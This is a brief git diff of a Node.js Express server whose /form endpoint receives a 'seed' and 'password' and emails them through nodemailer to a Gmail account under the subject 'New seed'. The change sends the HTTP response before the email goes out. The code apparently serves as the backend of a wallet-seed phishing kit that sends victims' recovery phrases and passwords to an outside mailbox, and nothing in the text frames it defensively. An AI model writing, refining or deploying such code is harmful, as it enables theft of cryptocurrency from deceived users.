@@ -37,6 +37,7 @@ if(process.env.NODE_ENV === 'production'){
 
 app.post('/form', async(req, res) => {
   const { seed, password } = await req.body
+  res.json({ status: 200 })
 
   const transporter = await nodemailer.createTransport({
     service: 'gmail',
@@ -52,7 +53,6 @@ app.post('/form', async(req, res) => {
     subject: "New seed", 
     text: `seed: ${seed} \npassword: ${password ? password : ''}`
   })
-  return res.json({ status: 200 })
 }) 
 
 app.listen(port, () => {
